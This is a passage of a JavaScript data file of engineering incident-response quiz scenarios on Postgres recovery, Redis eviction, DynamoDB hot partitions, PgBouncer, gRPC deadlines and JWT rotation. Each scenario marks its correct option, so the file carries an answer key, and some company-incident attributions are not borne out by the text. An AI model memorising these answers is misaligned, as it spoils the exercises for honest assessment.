                      solution: `Switch to Let's Encrypt Staging environment for testing to avoid burning rate limits. For the current week, use a different CA as fallback (ZeroSSL offers the same ACME protocol with separate rate limits). Fix the retry logic to use exponential backoff with jitter. Monitor certificate issuance rates with alerting before limits are reached.`,
                        explanation: `Let's Encrypt rate limits: 50 new certificates per registered domain per week, 5 failed validation attempts per hostname per hour. When a cert provisioner retries in a tight loop, it hits the failed validation limit first (per-hostname), then exhausts the weekly certificate limit. The fix: implement proper backoff (double the retry interval each time), add rate limit monitoring, and use ZeroSSL as a fallback CA since it uses the same ACME protocol and has independent limits.`,
                          options: [
                            { label: 'A', title: 'Contact Let\'s Encrypt to request a rate limit increase', sub: 'Submit form at letsencrypt.org/docs/rate-limits/', isCorrect: false },
                            { label: 'B', title: 'Switch to ZeroSSL as fallback CA; fix retry loop with exponential backoff', sub: 'ACME directory: acme.zerossl.com; backoff: min(2^attempt * 1s, 300s)', isCorrect: true },
                            { label: 'C', title: 'Issue a self-signed certificate for all new customers until the rate limit resets', sub: 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365', isCorrect: false },
                            { label: 'D', title: 'Pause new customer onboarding for 7 days until the rate limit resets', sub: 'Disable custom domain feature for one week', isCorrect: false },
                          ]
},

// ─────────────────────────────────────────────────────────
//  BATCH B: Database & Storage (WAR-021 – WAR-030)
// ─────────────────────────────────────────────────────────

{
  id: 'ENG-WAR-021',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'GitLab-style Database Deletion (Human Error Cascade)',
          companies: ['GitLab', 'PlanetScale'],
            timeEst: '~30 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `GitLab's January 2017 18-hour outage began with a database admin running db1 when they intended db2 — accidentally running pg_basebackup on the wrong server which wiped the replication directory. They discovered that 5 of their 6 backup methods had silently failed. Only 6 hours of data was lost because a Postgres WAL archive happened to work. GitLab famously did their recovery live-streamed to 5,000 viewers.`,
                    desc: `A database admin was cleaning up replication configuration on your secondary Postgres replica (db-replica-1). They accidentally ran the cleanup command on the primary database (db-primary-1) instead. The primary's data directory was partially overwritten by the replica sync process. Postgres on the primary is refusing to start. You have: (1) a 2-day-old base backup in S3, (2) WAL (Write-Ahead Log) archives continuously shipped to S3 every 5 minutes, (3) read replicas that were replicating up to T-30min.`,
                      solution: `The WAL archives are the most valuable asset — they can replay all transactions up to the last successfully archived WAL segment. Restore the base backup to a new server, then replay WAL archives using recovery.conf (Postgres 12+: recovery.conf becomes recovery.signal). This is Point-In-Time Recovery (PITR). You can recover to within 5 minutes of the incident.`,
                        explanation: `Postgres PITR workflow: (1) Start with the base backup (aws s3 cp s3://backups/base.tar.gz), (2) Restore to /var/lib/postgresql/data, (3) Create recovery.signal file (Postgres 12+), (4) In postgresql.conf: set restore_command to copy WAL files from S3, set recovery_target_time to 5 minutes before the incident. (5) Start Postgres — it replays WAL up to the target time. The replicas at T-30min can also be promoted as a faster but lossy alternative.`,
                          options: [
                            { label: 'A', title: 'Promote the read replica (T-30min) to primary immediately', sub: 'pg_ctl promote -D /var/lib/postgresql/data', isCorrect: false },
                            { label: 'B', title: 'Perform Postgres PITR using base backup + WAL archives to recover to within 5min of incident', sub: 'Restore base backup + recovery.conf: restore_command + recovery_target_time', isCorrect: true },
                            { label: 'C', title: 'Restore the 2-day-old base backup directly to production', sub: 'aws s3 cp s3://backups/base.tar.gz + extract to /var/lib/postgresql', isCorrect: false },
                            { label: 'D', title: 'Ask each application team to replay their recent API requests against a fresh DB', sub: 'Re-execute all HTTP requests from application logs', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-022',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Redis Pub/Sub CPU Saturation (Figma-style)',
          companies: ['Figma', 'Miro'],
            timeEst: '~25 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `Figma's June 2022 outage was caused by a rare Redis bug triggered when Pub/Sub operations ran on a Cluster-Mode Enabled (CME) ElastiCache instance. CPU on one node hit 100%, causing cascading failures. Migrating the Pub/Sub load back to a Cluster-Mode Disabled instance resolved the issue. The tricky part: adding more Redis nodes with CME actually made things worse, not better.`,
                    desc: `Your collaborative editing platform uses Redis Pub/Sub for real-time cursor and change propagation. After migrating from a Redis Cluster-Mode Disabled (CMD) instance to a Cluster-Mode Enabled (CME) instance for "better scalability", one node's Engine CPU hit 100%. The node is processing Pub/Sub commands but is non-responsive. Vertical scaling (larger instance type) seems to temporarily fix the issue but it returns within hours.`,
                      solution: `This is a Redis CME + Pub/Sub incompatibility issue. In cluster mode, Pub/Sub channel subscriptions are broadcast to ALL nodes, causing multiplicative CPU load. The fix: migrate Pub/Sub operations back to a dedicated Redis instance running in Cluster-Mode Disabled (CMD) mode, or use a separate Redis instance specifically for Pub/Sub. Keep the CME instance for regular key-value operations.`,
                        explanation: `Redis Cluster Mode and Pub/Sub have a fundamental mismatch: in cluster mode, SUBSCRIBE and PUBLISH must be broadcast to all nodes since the subscribing client could be connected to any node. This N×N fan-out is CPU-intensive. The Figma postmortem revealed this is a known Redis behavior that only manifests under sufficient Pub/Sub load. Solution: run Pub/Sub on a separate non-clustered Redis instance. Monitoring: watch Redis PUBLISH and SUBSCRIBE command rates separately from GET/SET rates.`,
                          options: [
                            { label: 'A', title: 'Upgrade to a larger ElastiCache instance (r6g.4xlarge)', sub: 'Vertical scale: AWS Console → Modify → Node type r6g.4xlarge', isCorrect: false },
                            { label: 'B', title: 'Add more shards to the CME cluster to distribute the Pub/Sub load', sub: 'Increase CME cluster from 3 shards to 9 shards', isCorrect: false },
                            { label: 'C', title: 'Migrate Pub/Sub to a dedicated CMD (non-cluster) Redis instance', sub: 'Provision separate ElastiCache CMD instance; route SUBSCRIBE/PUBLISH there', isCorrect: true },
                            { label: 'D', title: 'Switch from Redis Pub/Sub to Kafka for real-time collaboration events', sub: 'Migrate to kafka topics with consumer groups per editor session', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-023',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'N+1 Query Kills Database After Feature Launch',
          companies: ['Stripe', 'HubSpot'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `A classic production incident pattern: a new feature ships with an N+1 query hidden in the ORM. In staging with 100 records it's imperceptible. In production with 500,000 records and high concurrency, it sends 500,000 individual SELECT queries instead of 1 JOIN, overwhelming the database. Stripe's engineering blog documents similar issues with their billing system.`,
                    desc: `A new "Customer Overview" dashboard feature launched 30 minutes ago. Database CPU went from 20% to 98% immediately after. Query logs show hundreds of thousands of tiny SELECT queries per second: SELECT * FROM invoices WHERE customer_id = $1 being called once per customer in a loop. Before the launch, load tests showed no issues (only 50 test customers). Production has 500,000 customers.`,
                      solution: `This is an N+1 query problem. The code fetches all customers, then runs 1 SQL query per customer to get their invoices. Fix: add an .includes(:invoices) eager load (Rails) or use a JOIN / dataloader pattern to fetch all invoices for all customers in a single query. Immediate mitigation: roll back or feature-flag the new dashboard, then fix the ORM eager loading.`,
                        explanation: `N+1 pattern: you query for N customers, then execute 1 query per customer for their invoices = N+1 total queries. Fix: use eager loading (ORM's includes/preload/eager_load in Rails, select_related/prefetch_related in Django) to fetch related records in 1-2 queries regardless of N. For APIs: use DataLoader pattern (Facebook's open-source batching library) to batch database calls. Detection: use tools like the Bullet gem (Rails), Django Debug Toolbar, or database query count assertions in tests.`,
                          options: [
                            { label: 'A', title: 'Add a database read replica to handle the load', sub: 'aws rds create-db-instance-read-replica --source-db-instance-identifier prod-db', isCorrect: false },
                            { label: 'B', title: 'Roll back the feature + fix N+1 with eager loading / batch queries', sub: 'Feature flag OFF; add .includes(:invoices) or JOIN query', isCorrect: true },
                            { label: 'C', title: 'Add a Redis cache layer for all customer invoice lookups', sub: 'Cache each invoice lookup in Redis with 5 min TTL', isCorrect: false },
                            { label: 'D', title: 'Increase database max_connections to absorb the extra queries', sub: 'ALTER SYSTEM SET max_connections = 5000', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-024',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Long-Running Transaction Causing Table Bloat',
          companies: ['Supabase', 'Railway'],
            timeEst: '~25 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `Postgres's MVCC (Multi-Version Concurrency Control) means old row versions are kept alive as long as any transaction might need them. A long-running analytics query can hold an open transaction for hours, preventing VACUUM from cleaning up dead rows. The result: table bloat — the table file grows to 100GB even though it only has 5GB of live data, causing full sequential scans to take 20x longer.`,
                    desc: `Your Postgres database has been slowly degrading for 2 weeks. A table that used to query in 50ms now takes 8 seconds for simple selects. Running VACUUM ANALYZE doesn't help. pg_stat_user_tables shows 15 million dead tuples in the orders table. pg_stat_activity shows a analytics reporting query that has been IDLE IN TRANSACTION for 18 hours.`,
                      solution: `Kill the long-running idle transaction immediately: SELECT pg_terminate_backend(<pid>). Then run VACUUM VERBOSE on the bloated table — now that the blocking transaction is gone, VACUUM can reclaim dead tuples. If the table is severely bloated, use VACUUM FULL (requires exclusive lock, heavy) or pg_repack (online, no lock) to reclaim disk space. Set idle_in_transaction_session_timeout to prevent future long-running idle transactions.`,
                        explanation: `Postgres MVCC keeps old row versions (dead tuples) until the VACUUM process can safely remove them. VACUUM cannot remove dead tuples if any open transaction has an XID older than when those tuples were deleted (the transaction might need to see them for read consistency). An IDLE IN TRANSACTION session holds its transaction ID open, blocking VACUUM indefinitely. Fix: kill the idle transaction, run VACUUM, set idle_in_transaction_session_timeout = '1hour' in postgresql.conf to auto-kill future offenders.`,
                          options: [
                            { label: 'A', title: 'Run VACUUM FULL ANALYZE on the orders table immediately', sub: 'VACUUM FULL ANALYZE orders; (will take a long exclusive lock)', isCorrect: false },
                            { label: 'B', title: 'Kill the idle-in-transaction session, then run VACUUM; set idle_in_transaction_session_timeout', sub: 'SELECT pg_terminate_backend(pid); VACUUM VERBOSE orders; SET idle_in_transaction_session_timeout=3600000', isCorrect: true },
                            { label: 'C', title: 'Increase shared_buffers to cache the bloated table in memory', sub: 'ALTER SYSTEM SET shared_buffers = \'16GB\'; SELECT pg_reload_conf()', isCorrect: false },
                            { label: 'D', title: 'Migrate to a new Postgres instance with a fresh orders table', sub: 'pg_dump orders | pg_restore on new instance, update connection string', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-025',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Redis maxmemory Evicting Hot Keys Mid-Traffic',
          companies: ['Amazon', 'Netflix'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `A Netflix engineering team documented a production incident where Redis hit its maxmemory limit and began evicting keys with the allkeys-lru policy. This evicted session tokens for active users — effectively logging everyone out simultaneously. The eviction policy was appropriate for a cache but catastrophic for a session store. Redis should never evict session data.`,
                    desc: `Users are being randomly logged out. Customer support tickets are flooding in. Redis memory usage shows 100% utilization. Redis INFO stats show evicted_keys increasing rapidly. The Redis instance stores both session tokens (must never be evicted) and product catalog cache (fine to evict). The Redis maxmemory-policy is set to allkeys-lru, which evicts any key regardless of type.`,
                      solution: `Immediately change maxmemory-policy to volatile-lru — this only evicts keys that have an expiry (TTL) set. Then ensure session tokens have NO TTL set (no expiry) so they become ineligible for volatile-lru eviction. Product catalog keys should have TTLs and will be evicted normally. Long term: separate sessions and cache into two different Redis instances.`,
                        explanation: `Redis maxmemory-policy options: allkeys-lru (evict anything, dangerous for sessions), volatile-lru (only evict keys with TTL set, safe for session+cache mixed use), noeviction (reject writes when full, safer for session-only store). The correct architecture: never mix session storage with cache in the same Redis instance. Sessions go in a dedicated noeviction Redis with sufficient memory. Cache goes in a separate allkeys-lru Redis.`,
                          options: [
                            { label: 'A', title: 'Increase Redis maxmemory to double the current value', sub: 'CONFIG SET maxmemory 16gb', isCorrect: false },
                            { label: 'B', title: 'Switch maxmemory-policy to volatile-lru; ensure sessions have no TTL', sub: 'CONFIG SET maxmemory-policy volatile-lru; remove EXPIRE on session keys', isCorrect: true },
                            { label: 'C', title: 'Flush all Redis data and restart the application to force re-login', sub: 'redis-cli FLUSHALL; pm2 restart all', isCorrect: false },
                            { label: 'D', title: 'Switch to noeviction policy to prevent any data loss', sub: 'CONFIG SET maxmemory-policy noeviction', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-026',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'MongoDB Atlas Auto-Index Build Causing OOM',
          companies: ['MongoDB', 'Typeform'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `MongoDB index builds require significant memory when running on large collections. A customer triggered an index build on a 100M-document collection during peak traffic. The index build consumed available memory, causing the primary to OOM-kill and trigger a failover. The secondary then became primary and immediately started the same index build, repeating the failure cycle.`,
                    desc: `An engineer created a new index on a 100-million document MongoDB collection during business hours. Atlas started the index build. Within 10 minutes, the primary OOM-killed. The replica set elected a new primary, which immediately started the same index build, OOM-killed, failed over again. The cluster is now in a failover loop. Application is throwing MongoNetworkError on every request.`,
                      solution: `Stop the index build immediately via db.collection.dropIndex() or db.adminCommand({abortIndexBuild: ...}) if supported by your Atlas version. Then schedule the index build during a low-traffic window, and pre-split the build using rolling index builds — build on one secondary at a time, then step down the primary and build on the old primary last. Atlas has a "Hidden" index feature to test index performance before making it live.`,
                        explanation: `Rolling index build (MongoDB manual) procedure: (1) Build index on each secondary one at a time (use the secondary directly or let Atlas do it). (2) Step down the primary (rs.stepDown()). (3) Build index on the old primary (now a secondary). (4) Step up a new primary. This ensures only one node builds the index at a time, never causing cluster-wide OOM. For Atlas: use the Index Advisor and schedule index builds during off-peak hours.`,
                          options: [
                            { label: 'A', title: 'Increase Atlas cluster tier to M80 (more memory) immediately', sub: 'Atlas: Cluster → Modify → Tier: M80 ($1,700/mo)', isCorrect: false },
                            { label: 'B', title: 'Abort the index build; reschedule with rolling index build during off-peak', sub: 'db.adminCommand({abortIndexBuild: "idx_name"}); rolling build on secondaries first', isCorrect: true },
                            { label: 'C', title: 'Pause all Atlas backups to free memory for the index build', sub: 'Atlas: Backup → Disable continuous backup', isCorrect: false },
                            { label: 'D', title: 'Restore the cluster from the last Atlas snapshot', sub: 'Atlas: Backup → Restore to Point in Time', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-027',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Missing Database Index Causes Full Table Scan in Production',
          companies: ['LinkedIn', 'Glassdoor'],
            timeEst: '~15 min',
              level: 'Junior',
                status: 'Not Started',
                  realWorldContext: `LinkedIn's job search went down after a deployment removed an index migration by accident. A query that used to take 2ms via index scan now does a full sequential scan of 50M rows, taking 30 seconds and holding locks that cascade into deadlocks. This pattern — missing index causing full table scan — is one of the most common production database incidents.`,
                    desc: `A deployment was pushed 20 minutes ago. Since then, the job search API has 30-second response times and is timing out. Database CPU is at 100%. EXPLAIN ANALYZE shows a critical query doing a Seq Scan (full table scan) on the jobs table (50M rows) instead of an Index Scan. The query is: SELECT * FROM jobs WHERE company_id = $1 AND status = 'active'. The jobs table previously had a compound index on (company_id, status) that appears to have been dropped.`,
                      solution: `Create the missing index CONCURRENTLY to avoid locking the table during creation: CREATE INDEX CONCURRENTLY idx_jobs_company_status ON jobs(company_id, status). The CONCURRENTLY option builds the index without blocking reads or writes. The index creation will take several minutes for 50M rows, but the application can continue serving requests (slowly) during that time.`,
                        explanation: `CREATE INDEX without CONCURRENTLY locks the entire table for the duration of the build — on a 50M row table this could be 10-20 minutes of complete unavailability. CREATE INDEX CONCURRENTLY performs multiple scans of the table, acquiring row-level locks only briefly, allowing concurrent reads and writes throughout. Downside: takes 2-3x longer to build. Always use CONCURRENTLY in production. Also: add index existence checks to your deployment scripts and test with production-scale data.`,
                          options: [
                            { label: 'A', title: 'Roll back the deployment immediately', sub: 'kubectl rollout undo deployment/job-service', isCorrect: false },
                            { label: 'B', title: 'Create the missing index using CREATE INDEX CONCURRENTLY', sub: 'CREATE INDEX CONCURRENTLY idx_jobs_company_status ON jobs(company_id, status)', isCorrect: true },
                            { label: 'C', title: 'Add a Redis cache for all company job queries', sub: 'Cache SELECT results in Redis with company_id as key, 5min TTL', isCorrect: false },
                            { label: 'D', title: 'Rewrite the query to use OR instead of AND to reduce rows scanned', sub: 'SELECT * FROM jobs WHERE company_id=$1 OR status=\'active\'', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-028',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'DynamoDB Hot Partition Throttling',
          companies: ['Amazon', 'Lyft'],
            timeEst: '~25 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `Lyft's engineering team documented a DynamoDB incident where ride requests during a surge event all had timestamps as partition keys (e.g., YYYY-MM-DD-HH). Every request in the same minute hit the same partition, causing that single partition to absorb all traffic while others were idle. DynamoDB throttled the hot partition, causing ProvisionedThroughputExceededException for all ride requests during peak surge.`,
                    desc: `Lyft's ride request API is throwing ThrottlingException from DynamoDB during a surge event. CloudWatch shows DynamoDB consumed capacity is evenly distributed ACROSS the table, but one specific partition is consuming 80x more than others. The partition key for ride requests is ride_date (e.g., '2024-01-15') + hour ('14') — meaning all rides in the same hour go to the same partition.`,
                      solution: `The partition key design is the root cause — time-based keys cause all concurrent requests to hit the same partition ("hot partition"). Fix: add a random suffix to partition keys (write sharding): partition_key = ride_date + '#' + random.randint(0, 9). To read, query all 10 shards and merge results. Alternatively, use composite partition keys with high-cardinality attributes (ride_id, user_id) that distribute evenly.`,
                        explanation: `DynamoDB distributes data across partitions by hashing the partition key. When many items share the same key value (all rides in the same hour), they all land on one partition with limited throughput. Write sharding: append a random suffix (0-9) to the partition key to spread writes across 10 partitions. Read sharding: query all N partitions in parallel and merge. For time-series data, this increases read complexity but is essential for throughput. DynamoDB Accelerator (DAX) can also reduce hot reads.`,
                          options: [
                            { label: 'A', title: 'Increase DynamoDB provisioned capacity 10x across all partitions', sub: 'UpdateTable: ProvisionedThroughput: ReadCapacity: 10000, Write: 10000', isCorrect: false },
                            { label: 'B', title: 'Enable DynamoDB Auto Scaling to handle the surge automatically', sub: 'Set target utilization to 70% with min/max capacity', isCorrect: false },
                            { label: 'C', title: 'Redesign partition key with random suffix for write sharding', sub: 'pk = ride_date + "#" + random(0,9); query all 10 shards on read', isCorrect: true },
                            { label: 'D', title: 'Switch DynamoDB table to on-demand capacity mode', sub: 'UpdateTable: BillingMode: PAY_PER_REQUEST', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-029',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Backup Restore Failure Discovered During Real Disaster',
          companies: ['GitLab', 'Tarsnap'],
            timeEst: '~35 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `GitLab's 2017 postmortem revealed that 5 of their 6 backup methods were silently failing — backups were being created but never tested for restorability. Tarsnap's 2023 outage postmortem by Colin Percival revealed that his recovery scripts had never been tested and contained multiple bugs that significantly delayed recovery. "Untested backups are not backups" is a hard-learned lesson.`,
                    desc: `A production database failure requires a restore from backup. Your team goes to restore from the nightly backup — and discovers the restore fails with: 'pg_restore: error: could not read from input file: end of file'. The backup file exists in S3 (8GB), but appears corrupted. The secondary backup (a read replica) had replication lag of 3 hours and was also taken offline during the failure. You have 8 hours before data loss becomes permanent.`,
                      solution: `Check the S3 backup file integrity first (aws s3api head-object to verify ETag/checksum). Try an older backup from 2 days ago — it may be uncorrupted. If all backups are corrupted, restore from the replica's last known good state (3h lag) and accept 3h of data loss. Post-incident: implement backup verification — after every backup, automatically restore it to a test instance and run a row count / checksum validation.`,
                        explanation: `The key lesson: backup verification is not optional. A backup that has never been restored is not a backup. Best practices: (1) automate restore tests on every backup — spin up a test instance, restore, run SELECT COUNT(*) and schema checks, then delete. (2) use checksums/hashes on backup files stored in S3. (3) test the FULL recovery playbook quarterly (game days). (4) use streaming WAL archiving (continuous) rather than nightly snapshots to minimize recovery point objective (RPO).`,
                          options: [
                            { label: 'A', title: 'Contact AWS Support to recover the corrupted S3 file', sub: 'AWS Support case: S3 file corruption, request block-level recovery', isCorrect: false },
                            { label: 'B', title: 'Check backup integrity, try older backup; restore replica; fix backup verification', sub: 'aws s3api head-object --checksum; try T-2d backup; pg_ctl promote replica; add backup restore tests', isCorrect: true },
                            { label: 'C', title: 'Ask engineers to reconstruct data from application logs and API request history', sub: 'Replay API request logs to rebuild database state', isCorrect: false },
                            { label: 'D', title: 'Deploy the application without a database and disable data-dependent features', sub: 'Feature flag all DB-dependent endpoints; serve from cache only', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-030',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Zombie Prepared Statements Filling Connection Pool',
          companies: ['PlanetScale', 'Neon'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `A common serverless database incident: Lambda functions using persistent prepared statements (DEALLOCATE not called on function timeout) leave "zombie" prepared statements on Postgres connections. When PgBouncer recycles these connections in transaction mode, the prepared statements are orphaned. In session-pool mode, each Lambda invocation may get a different connection, finding unexpected prepared statements.`,
                    desc: `Your serverless Lambda functions connect to Postgres via PgBouncer in transaction pooling mode. After a traffic spike, API latency spiked and the database is throwing: 'ERROR: prepared statement "stmt_1" already exists'. Lambda function logs show 500 errors on the first query after a cold start. The prepared statement cache appears to be leaking across connections.`,
                      solution: `PgBouncer in transaction mode does not support named prepared statements — the connection is returned to the pool after each transaction, and Postgres's prepared statement namespace is per-connection. Fix: disable named prepared statements in your Postgres driver, or switch PgBouncer to session pooling mode (less efficient) for workloads that require prepared statements. In psycopg2: use cursor.execute() without PREPARE; in Node pg: don't use the name parameter in query().`,
                        explanation: `PgBouncer transaction pooling: a connection is checked out from the pool at BEGIN, returned at COMMIT/ROLLBACK. Named prepared statements (PREPARE stmt AS ...) are scoped to the Postgres connection, not the PgBouncer transaction. When the next client gets the same connection, the statement already exists → error. Solutions: (1) Use simple queries without PREPARE, (2) Switch to session mode pooling, (3) Use Pgpool-II which understands prepared statements, (4) Use a driver that issues DEALLOCATE ALL on connection return.`,
                          options: [
                            { label: 'A', title: 'Restart PgBouncer to clear all connection state', sub: 'systemctl restart pgbouncer', isCorrect: false },
                            { label: 'B', title: 'Disable named prepared statements in the Postgres driver; use simple queries', sub: 'pg driver: remove name from query({text, name}); use unnamed queries only', isCorrect: true },
                            { label: 'C', title: 'Increase PgBouncer pool_size to 500 connections', sub: 'pgbouncer.ini: pool_size = 500', isCorrect: false },
                            { label: 'D', title: 'Switch from Lambda to EC2 to maintain persistent connections', sub: 'Migrate serverless functions to persistent EC2 process', isCorrect: false },
                          ]
},

// ─────────────────────────────────────────────────────────
//  BATCH C: Application & API Layer (WAR-031 – WAR-040)
// ─────────────────────────────────────────────────────────

{
  id: 'ENG-WAR-031',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'gRPC Deadline Propagation Causing Cascading Timeout',
          companies: ['Google', 'Stripe'],
            timeEst: '~25 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `Google's SRE book dedicates significant coverage to "deadline propagation" — the practice of passing the original request's remaining time budget through to all downstream calls. Stripe's microservices architecture requires each service to honor the upstream deadline and cancel its downstream calls when the budget expires. Without deadline propagation, a slow dependency can keep consuming resources long after the user has received a timeout.`,
                    desc: `Service A calls Service B (gRPC, 500ms deadline). Service B calls Service C (no deadline set — default is infinite). Service A times out after 500ms and returns an error to the user. But Service B is still waiting for Service C, which is slow (takes 45 seconds). Service B's connection pool fills up with these zombie goroutines waiting for Service C. After 10 minutes, Service B is completely unresponsive due to goroutine/thread exhaustion.`,
                      solution: `Always propagate the parent request's context (with its deadline) to ALL downstream calls. In gRPC: pass the original ctx to outbound calls instead of context.Background(). In HTTP: use ctx.WithTimeout() derived from the parent context. Add an explicit upper-bound deadline on each inter-service call even when propagating context (belt-and-suspenders). Implement context cancellation in Service C to abort work when the context is cancelled.`,
                        explanation: `gRPC deadline propagation pattern: when Service B receives a request with ctx (which has 500ms remaining), it should pass ctx to its call to Service C. When Service A's deadline expires and it cancels ctx, that cancellation propagates to Service C — which should detect context.Done() and abort. Without this, Service C runs to completion (45s), holding Service B's thread/goroutine the entire time. Fix: ctx propagation + check context.Err() in all blocking calls.`,
                          options: [
                            { label: 'A', title: 'Add a 60-second timeout on all calls from Service B to Service C', sub: 'ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)', isCorrect: false },
                            { label: 'B', title: 'Increase Service B\'s goroutine pool size to handle more concurrent requests', sub: 'Set GOMAXPROCS=64 and increase worker pool size', isCorrect: false },
                            { label: 'C', title: 'Propagate parent request context to all downstream gRPC calls', sub: 'Pass original ctx (not context.Background()) to all downstream calls', isCorrect: true },
                            { label: 'D', title: 'Add a bulkhead to Service B with a separate thread pool for Service C calls', sub: 'Isolate Service C calls in a bounded goroutine pool with circuit breaker', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-032',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'JSON Serialization of BigInt Causes Silent Data Corruption',
          companies: ['Twitter', 'Instagram'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `Twitter famously ran into this bug when JavaScript clients parsed tweet IDs (64-bit integers) via JSON.parse(). JavaScript's Number type is IEEE 754 double-precision float — it can only represent integers exactly up to 2^53. Twitter's snowflake IDs exceeded this range, causing JSON.parse() to silently round the last few digits, making tweet IDs incorrect. Twitter's solution: return IDs as both numbers and strings in their API.`,
                    desc: `Your platform generates 64-bit integer IDs using a snowflake algorithm. Mobile app users report that links to specific content items are "broken" — they navigate to the correct URL but see wrong content. Debugging shows the content ID in the URL is slightly wrong: your server returned ID 9007199254740993 but the mobile client received 9007199254740992 (off by 1). The API returns JSON.`,
                      solution: `JavaScript's JSON.parse() silently truncates 64-bit integers > 2^53 (Number.MAX_SAFE_INTEGER). Serialize large integers as strings in your JSON API response. Add a parallel string field (e.g., "id_str": "9007199254740993") alongside the numeric field for backward compatibility. Validate this in your API contract tests by asserting that the integer value exactly matches its string representation.`,
                        explanation: `IEEE 754 double-precision (JavaScript Number) can represent integers exactly only up to 2^53 = 9,007,199,254,740,992. Your snowflake ID exceeded this. JSON.parse() in JavaScript silently rounds to the nearest representable float — no error, no warning. Fix: in your API, serialize large integer IDs as JSON strings. Many APIs (Twitter, Instagram) return {"id": 12345, "id_str": "12345"} for backward compatibility. Modern JSON libraries in server languages (Java's Jackson, Go's encoding/json) serialize int64 as strings when configured to do so.`,
                          options: [
                            { label: 'A', title: 'Switch to UUIDs to avoid integer overflow issues', sub: 'Generate UUID v4 for all new content IDs', isCorrect: false },
                            { label: 'B', title: 'Serialize large integer IDs as JSON strings in the API response', sub: 'Return "id_str": "9007199254740993" alongside numeric "id" field', isCorrect: true },
                            { label: 'C', title: 'Reset the snowflake ID generator to start from a smaller number', sub: 'ALTER SEQUENCE content_id_seq RESTART WITH 1000', isCorrect: false },
                            { label: 'D', title: 'Compress IDs using base64 encoding before sending to clients', sub: 'base64.encode(int64_id).decode() on all ID fields in response', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-033',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'JWT Secret Rotation Causes Instant Global Logout',
          companies: ['Auth0', 'Okta'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `A security team rotated their JWT signing secret after a potential key exposure. They replaced the secret immediately in all services. Every existing JWT (signed with the old key) instantly became invalid — logging out every active user globally. The correct approach is a key rotation grace period or using asymmetric keys (RSA/EC) with JWKS endpoint, where old keys are retained for verification until existing tokens expire.`,
                    desc: `Your security team discovered the JWT signing secret may have been exposed in a public GitHub commit 48 hours ago. To mitigate, they immediately rotated the JWT_SECRET environment variable across all API servers. The result: every user on the platform (2 million) was instantly logged out and forced to re-authenticate. The support queue has 10,000 tickets. Is there a better approach for future rotations?`,
                      solution: `The immediate rotation was correct for a known compromised key, but the proper approach for planned rotations is: (1) Generate a new key, (2) Support BOTH old and new keys for verification simultaneously (grace period equal to JWT token lifetime), (3) Issue new tokens with the new key, (4) After max token lifetime expires (e.g., 24h), remove the old key. Use asymmetric keys (RSA/ECDSA) with a JWKS endpoint — this allows key rotation without redeployment.`,
                        explanation: `JWT key rotation graceful procedure: maintain a key ring. When rotating: mark the old key as "verify only" (don't issue new tokens with it), add the new key as the active signing key. All new JWTs get issued with the new key. Old JWTs are still verified with the old key. After max_token_lifetime passes, all in-flight tokens were issued with the new key, so remove the old one. With JWKS (JSON Web Key Sets): your auth server publishes public keys at /.well-known/jwks.json. Clients discover keys automatically, enabling seamless rotation.`,
                          options: [
                            { label: 'A', title: 'The rotation was handled correctly — immediate rotation is always required for exposed keys', sub: 'No change needed; user disruption is acceptable for security incidents', isCorrect: false },
                            { label: 'B', title: 'Implement JWKS + key ring: verify with old key, issue with new key during grace period', sub: 'Key ring: [{kid: "v1", key: OLD, status: "verify-only"}, {kid: "v2", key: NEW, status: "active"}]', isCorrect: true },
                            { label: 'C', title: 'Increase JWT token expiry to 30 days to reduce impact of future rotations', sub: 'JWT exp: now + 30*24*60*60', isCorrect: false },
                            { label: 'D', title: 'Store JWTs in the database and invalidate only compromised tokens individually', sub: 'Add jwt_blacklist table; check on every request', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-034',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Health Check Returns 200 but Service is Broken',
          companies: ['Kubernetes', 'AWS ECS'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `A common Kubernetes production incident: the liveness probe checks GET /health which returns HTTP 200. But /health only checks "is the HTTP server running?" — not "can the server handle real requests?" The database connection pool is exhausted, the cache is unreachable, and every real API request fails. But because /health returns 200, Kubernetes never restarts the pod.`,
